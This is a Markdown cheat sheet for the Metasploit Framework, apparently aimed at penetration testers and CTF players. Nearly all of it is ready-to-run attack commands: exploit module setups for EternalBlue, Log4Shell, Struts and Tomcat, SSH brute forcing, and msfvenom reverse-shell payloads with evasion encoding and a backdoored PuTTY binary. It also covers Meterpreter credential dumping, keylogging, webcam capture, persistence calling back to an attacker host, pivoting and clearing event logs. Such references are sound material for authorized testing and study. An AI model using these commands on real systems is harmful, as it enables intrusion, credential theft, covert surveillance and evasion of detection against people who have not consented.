# Metasploit Framework (Exploitation, Post-Exploitation & Payload Generation)

> For authorized security testing, CTF competitions, and educational purposes only.

The Metasploit Framework is an open-source penetration testing platform for developing,
testing, and executing exploits against target systems.

---

## Getting Started

### Starting Metasploit

```bash
# Start the PostgreSQL database (required for db features)
sudo systemctl start postgresql

# Initialize the database (first time)
sudo msfdb init

# Launch msfconsole
msfconsole

# Launch quietly (no banner)
msfconsole -q

# Check database connection
msf6 > db_status
```

### Basic Navigation

```bash
# Search for modules
msf6 > search eternalblue
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2021-44228
msf6 > search name:apache type:exploit

# Use a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show module info
msf6 exploit(ms17_010_eternalblue) > info
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > show targets
msf6 exploit(ms17_010_eternalblue) > show advanced

# Set options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.0.0.5
msf6 exploit(ms17_010_eternalblue) > set RPORT 445
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.0.0.1
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set globally (persists across modules)
msf6 > setg RHOSTS 10.0.0.5
msf6 > setg LHOST 10.0.0.1

# Unset an option
msf6 > unset RHOSTS

# Run the exploit
msf6 exploit(ms17_010_eternalblue) > exploit
msf6 exploit(ms17_010_eternalblue) > run

# Run in background
msf6 exploit(ms17_010_eternalblue) > exploit -j

# Go back
msf6 exploit(ms17_010_eternalblue) > back
```

---

## Database & Workspaces

```bash
# Workspaces — isolate engagements
msf6 > workspace                     # list workspaces
msf6 > workspace -a client_pentest   # create new
msf6 > workspace client_pentest      # switch to
msf6 > workspace -d old_project      # delete

# Import scan results
msf6 > db_import /path/to/nmap_scan.xml

# View stored data
msf6 > hosts                         # discovered hosts
msf6 > hosts -c address,os_name      # specific columns
msf6 > services                      # discovered services
msf6 > services -p 445               # filter by port
msf6 > vulns                         # found vulnerabilities
msf6 > creds                         # harvested credentials
msf6 > loot                          # collected loot/files

# Run nmap from within Metasploit (stores in db automatically)
msf6 > db_nmap -sV -sC 10.0.0.0/24
```

---

## Common Exploit Modules

```bash
# SMB — EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# SMB — PsExec (requires valid creds)
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.5
set SMBUser administrator
set SMBPass Password123
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.5
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# HTTP — Apache Struts RCE
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 10.0.0.5
set TARGETURI /struts2-showcase/
run

# Java RMI
use exploit/multi/misc/java_rmi_server
set RHOSTS 10.0.0.5
run

# Tomcat manager upload
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.0.0.5
set HttpUsername tomcat
set HttpPassword tomcat
run

# Log4Shell (CVE-2021-44228)
use exploit/multi/http/log4shell_header_injection
set RHOSTS 10.0.0.5
set TARGETURI /
run

# vsftpd 2.3.4 backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.0.5
run
```

---

## Auxiliary Modules (Scanning & Enumeration)

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,443,445,3389
set THREADS 50
run

# SMB version scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run

# SMB enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.0.0.5
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.0.0.5
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.0.0.5
run

# FTP anonymous login check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 10.0.0.0/24
run

# SNMP community string scanner
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 10.0.0.0/24
run

# Vulnerability scanners
use auxiliary/scanner/smb/smb_ms17_010   # check for EternalBlue
set RHOSTS 10.0.0.0/24
run
```

---

## Payload Generation with msfvenom

```bash
# List all payloads
msfvenom -l payloads

# List formats
msfvenom -l formats

# List encoders
msfvenom -l encoders

# --- Windows payloads ---

# Reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Stageless reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o payload.dll

# MSI installer (for AlwaysInstallElevated)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o shell.msi

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-cmd

# --- Linux payloads ---

# ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# --- Web payloads ---

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

# --- Encoding/Evasion ---

# Encode with shikata_ga_nai
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

# Inject into existing executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -x /path/to/putty.exe -k -f exe -o backdoored_putty.exe
```

---

## Handlers (Listeners)

```bash
# Quick multi/handler setup
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 0.0.0.0
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j   # run in background

# One-liner handler
msf6 > handler -p windows/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 4444

# Multiple handlers (different ports/payloads)
# Just set different LPORT values and run each as background job

# Manage sessions
msf6 > sessions              # list active sessions
msf6 > sessions -i 1         # interact with session 1
msf6 > sessions -k 1         # kill session 1
msf6 > sessions -K           # kill all sessions
```

---

## Meterpreter Commands

```bash
# System info
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Privilege escalation
meterpreter > getsystem                      # attempt auto privesc
meterpreter > getprivs                       # list privileges

# Process management
meterpreter > ps                             # list processes
meterpreter > migrate PID                    # migrate to process
meterpreter > migrate -N explorer.exe        # migrate by name

# File system
meterpreter > pwd
meterpreter > cd C:\\Users
meterpreter > ls
meterpreter > download C:\\Users\\admin\\Desktop\\flag.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\temp\\
meterpreter > cat C:\\Users\\admin\\Desktop\\notes.txt
meterpreter > search -f *.txt -d C:\\Users

# Networking
meterpreter > ipconfig
meterpreter > route
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.0.5   # port forward
meterpreter > portfwd list
meterpreter > arp

# Credential harvesting
meterpreter > hashdump                       # dump SAM hashes
meterpreter > load kiwi                      # load mimikatz
meterpreter > creds_all                      # dump all creds
meterpreter > kerberos_ticket_list           # Kerberos tickets
meterpreter > lsa_dump_sam                   # SAM via LSA

# Keylogging
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Screenshots and webcam
meterpreter > screenshot
meterpreter > webcam_snap

# Shell access
meterpreter > shell                          # drop to system shell
meterpreter > execute -f cmd.exe -i -H       # hidden cmd

# Persistence
meterpreter > run persistence -U -i 30 -p 4444 -r 10.0.0.1

# Background session
meterpreter > background
```

---

## Post-Exploitation Modules

```bash
# Run post modules from meterpreter or from msf console

# Enumerate system
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > set SESSION 1
msf6 > run

# Credential gathering
use post/windows/gather/credentials/credential_collector
use post/multi/gather/ssh_creds
use post/windows/gather/hashdump
use post/linux/gather/hashdump

# Persistence
use exploit/windows/local/persistence_service
use post/windows/manage/persistence_exe

# Pivoting
meterpreter > run autoroute -s 10.10.0.0/24
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j
# Then use proxychains with Metasploit's SOCKS proxy

# Local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Clearev — clear event logs (Windows)
meterpreter > clearev
```

---

## Tips

- Use `staged` payloads (e.g., `meterpreter/reverse_tcp`) for smaller initial payload; use `stageless` (`meterpreter_reverse_tcp`) when staged connections are unreliable
- Always run handlers with `exploit -j` to keep them in the background
- Use `autoroute` and `socks_proxy` together for pivoting through compromised hosts
- `local_exploit_suggester` is one of the most valuable post modules -- run it on every session
- Set `AutoRunScript` to automatically execute commands when a session opens
- Use `resource` files (.rc) for repeatable attack sequences: `msfconsole -r attack.rc`
- Keep Metasploit updated: `sudo apt update && sudo apt install metasploit-framework`
- The database dramatically improves workflow -- always use it
- Use `vulns` command after running scanners to see all identified vulnerabilities in one place

---

## References

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed (Offensive Security)](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Metasploit GitHub](https://github.com/rapid7/metasploit-framework)
- [msfvenom Cheat Sheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
- [Meterpreter Commands Reference](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
